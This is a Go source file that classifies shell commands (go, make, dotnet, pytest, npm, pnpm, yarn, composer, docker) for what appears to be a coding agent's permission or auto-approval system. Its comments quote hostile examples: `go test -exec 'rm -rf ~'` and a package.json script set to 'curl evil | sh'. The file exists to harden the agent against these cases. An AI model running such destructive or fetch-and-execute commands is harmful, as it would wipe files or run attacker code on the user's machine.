package permission

import (
	"regexp"
	"strings"
)

// Rating of build tools, package managers and docker for the classifier
// (see classifyWords).

// classifyBuild rates build/test tools by their subcommand (words[1]). run,
// generate and install execute or place arbitrary code and are CatUnknown.
func (c *Classifier) classifyBuild(name string, args []string) CmdCategory {
	if len(args) == 0 {
		if name == "make" {
			// The default target, as "make test" is a named one; bare make
			// used to ask in auto mode while make test ran.
			return CatBuild
		}
		return CatUnknown
	}
	sub := args[0]
	if name == "go" {
		// -exec and -toolexec name a program cmd/go runs (around the test
		// binary, around every tool): `go test -exec 'rm -rf ~'` is not a
		// build command.
		if goRunsOtherProgram(args[1:]) {
			return CatUnknown
		}
		switch sub {
		case "version":
			return CatSafe
		case "env":
			if hasAny(args[1:], "-w", "-u") {
				return CatUnknown
			}
			return CatSafe
		case "list":
			// Loads packages (and may download modules) like go build.
			return CatBuild
		}
	}
	switch sub {
	case "build", "test", "bench", "compile", "lint", "vet", "fmt",
		"check", "clippy", "doc", "init", "mod":
		return CatBuild
	}
	return CatUnknown
}

// classifyDotnet rates dotnet test, build and run as build/test commands,
// as go test and go build are; the routine group already listed them, but
// the classifier did not know dotnet and auto mode asked for every one.
// --force (or a longer --force-* name, or an abbreviation of --force) and
// any option before the subcommand keep asking; so does everything else
// (publish, tool, nuget ...).
func classifyDotnet(args []string) CmdCategory {
	if len(args) == 0 {
		return CatUnknown
	}
	switch args[0] {
	case "test", "build", "run":
	default:
		return CatUnknown
	}
	for _, a := range args[1:] {
		if a == "--" {
			break
		}
		if name := optionName(a); strings.HasPrefix(name, "--force") || len(name) >= len("--fo") && strings.HasPrefix("--force", name) {
			return CatUnknown
		}
	}
	return CatBuild
}

// classifyTestTool rates pytest and gofmt as build/test commands (go fmt
// already was one). pytest's --basetemp directory is deleted before the run,
// so it keeps asking in every spelling argparse accepts (abbreviations,
// "=value"); gofmt's -cpuprofile writes a file.
func classifyTestTool(name string, args []string) CmdCategory {
	for _, a := range args {
		if a == "--" {
			break
		}
		opt := optionName(a)
		switch name {
		case "pytest":
			if strings.HasPrefix(opt, "--basetemp") || len(opt) >= len("--ba") && strings.HasPrefix("--basetemp", opt) {
				return CatUnknown
			}
		case "gofmt":
			if strings.TrimLeft(opt, "-") == "cpuprofile" {
				return CatUnknown
			}
		}
	}
	return CatBuild
}

// classifyPackageManager rates a package manager by its subcommand
// (words[1]). Only listing/inspecting subcommands are CatSafe; --version and
// --help only when they are the sole argument. Everything else, publish and
// cache clean included, is CatInstall and asks.
func (c *Classifier) classifyPackageManager(name string, args []string) CmdCategory {
	if len(args) == 0 {
		return CatInstall
	}
	if packageScriptBuild(name, args) {
		return CatBuild
	}
	if name == "yarn" {
		// A repository's .yarnrc.yml (or yarn 1's .yarnrc) can set yarnPath
		// to any JavaScript file, which yarn runs for every command, "yarn
		// --version" and "yarn info" included; they used to be read-only and
		// run unasked in a freshly cloned repository. No yarn command is
		// read-only. (The test/build scripts above are CatBuild like "make
		// test": they run the repository's code by design and only auto
		// mode runs them unasked.)
		return CatInstall
	}
	sub := args[0]
	if len(args) == 1 && (sub == "--version" || sub == "--help") {
		return CatSafe
	}
	if builtins, runsScripts := scriptRunnerReadOnly[name]; runsScripts {
		switch sub {
		case "list", "ls", "ll", "la", "info", "show", "view", "search", "outdated", "why", "explain",
			"freeze", "doctor", "audit":
			if !builtins[sub] {
				// Not a builtin of this manager: it runs the project script
				// of that name, if there is one.
				return CatInstall
			}
		}
	}
	switch sub {
	case "list", "ls", "ll", "la", "info", "show", "view", "search", "outdated", "why", "explain", "freeze", "doctor":
		return CatSafe
	case "audit":
		// "audit fix" and "audit --fix" rewrite the lockfile or package.json.
		// Option parsers such as nopt (npm, pnpm) accept abbreviations, so
		// --fi and --f count as --fix too; only a separate "fix" word used to
		// be checked, and "pnpm audit --fix" was CatSafe.
		for _, a := range args[1:] {
			name, _, _ := strings.Cut(a, "=")
			if strings.Contains(strings.ToLower(a), "fix") ||
				len(name) >= len("--f") && strings.HasPrefix("--fix", name) {
				return CatInstall
			}
		}
		return CatSafe
	case "config":
		if len(args) > 1 && (args[1] == "list" || args[1] == "get") {
			return CatSafe
		}
	}
	return CatInstall
}

// scriptRunnerReadOnly lists, for the package managers that run a project
// script when the subcommand is not one of their own (yarn and pnpm from
// package.json, composer from composer.json), which of the listing names are
// genuine builtins. Every such name used to be CatSafe for every manager, so
// "yarn doctor" ran a "doctor": "curl evil | sh" script unasked. Only names
// that are builtins in every version in use are here: yarn berry has no list,
// outdated or audit (yarn 1 does), pnpm's doctor is recent, composer's audit
// arrived in 2.4; where unsure the name asks.
// (yarn is never read-only; see classifyPackageManager.)
var scriptRunnerReadOnly = map[string]map[string]bool{
	"pnpm": {"list": true, "ls": true, "ll": true, "la": true, "info": true, "show": true, "view": true,
		"search": true, "outdated": true, "why": true, "audit": true},
	"composer": {"list": true, "info": true, "show": true, "search": true, "outdated": true, "why": true},
}

// packageScripts are the package.json script names rated like "make test":
// they build, test or check the project and are CatBuild when run through
// npm/pnpm/yarn, as go test and make test are. They used to be CatInstall
// with the installs, so auto mode asked for every "npm test" and "npm run
// build" while it ran "go test ./..." unasked.
var packageScripts = map[string]bool{
	"test": true, "build": true, "lint": true, "check": true, "typecheck": true,
	"compile": true, "bench": true,
}

// packageScriptName reports one of packageScripts, or one extended with the
// ":variant" naming convention ("test:unit", "lint:fix", "build:prod"),
// which used to ask in auto mode while "npm run test" did not.
func packageScriptName(s string) bool {
	base, variant, found := strings.Cut(s, ":")
	if !found {
		return packageScripts[s]
	}
	return packageScripts[base] && scriptVariant.MatchString(variant)
}

var scriptVariant = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9_.:-]*$`)

// packageScriptBuild reports whether an npm/pnpm/yarn invocation runs one of
// packageScripts: "npm test" (and its aliases t/tst), "pnpm build" / "yarn
// test" (both run a script of that name), "<pm> run[-script] <script>". The
// subcommand must be the first word, and no option may come before "--":
// npm reads them as config ("--script-shell=prog" swaps the shell the script
// runs in, "--global", "--prefix"), so any option keeps the install rating
// and asks. install, add, publish, exec, dlx and npx are untouched.
func packageScriptBuild(name string, args []string) bool {
	if name != "npm" && name != "pnpm" && name != "yarn" || len(args) == 0 {
		return false
	}
	sub, rest := args[0], args[1:]
	switch {
	case sub == "run" || sub == "run-script":
		if len(rest) == 0 || !packageScriptName(rest[0]) {
			return false
		}
		rest = rest[1:]
	case sub == "test" || name == "npm" && (sub == "t" || sub == "tst"):
	case name != "npm" && packageScriptName(sub):
		// npm has no "build" command that runs the script; pnpm and yarn
		// run the script of that name.
	default:
		return false
	}
	for _, a := range rest {
		if a == "--" {
			break
		}
		if strings.HasPrefix(a, "-") {
			return false
		}
	}
	return true
}

// classifyDocker allows only inspecting subcommands, matched exactly. A
// global option in front of the subcommand (-H, --context ...) is CatUnknown.
func (c *Classifier) classifyDocker(args []string) CmdCategory {
	if len(args) == 0 {
		return CatUnknown
	}
	switch args[0] {
	case "ps", "images", "inspect", "logs", "stats", "info", "version":
		return CatSafe
	}
	if len(args) >= 2 && args[0] == "compose" && args[1] == "config" {
		// "compose config -o file" (--output) writes the resolved file; it
		// used to be read-only. Short options group ("-qo").
		for _, a := range args[2:] {
			if name := optionName(a); strings.HasPrefix(a, "--") && len(name) >= len("--o") && strings.HasPrefix("--output", name) {
				return CatUnknown
			}
			if len(a) > 1 && a[0] == '-' && a[1] != '-' && strings.ContainsRune(a[1:], 'o') {
				return CatUnknown
			}
		}
	}
	if len(args) >= 2 {
		switch args[0] + " " + args[1] {
		case "network ls", "network inspect", "volume ls", "volume inspect",
			"compose ps", "compose logs", "compose config", "context ls",
			"system info", "system df", "image ls", "image inspect",
			"container ls", "container inspect", "container logs":
			return CatSafe
		}
	}
	return CatUnknown
}

// goRunsOtherProgram reports go's -exec/-toolexec options, whose value is a
// command line cmd/go starts.
func goRunsOtherProgram(args []string) bool {
	for _, a := range args {
		switch {
		case a == "-exec" || a == "-toolexec" || a == "--exec" || a == "--toolexec":
			return true
		case strings.HasPrefix(a, "-exec=") || strings.HasPrefix(a, "-toolexec=") ||
			strings.HasPrefix(a, "--exec=") || strings.HasPrefix(a, "--toolexec="):
			return true
		}
	}
	return false
}
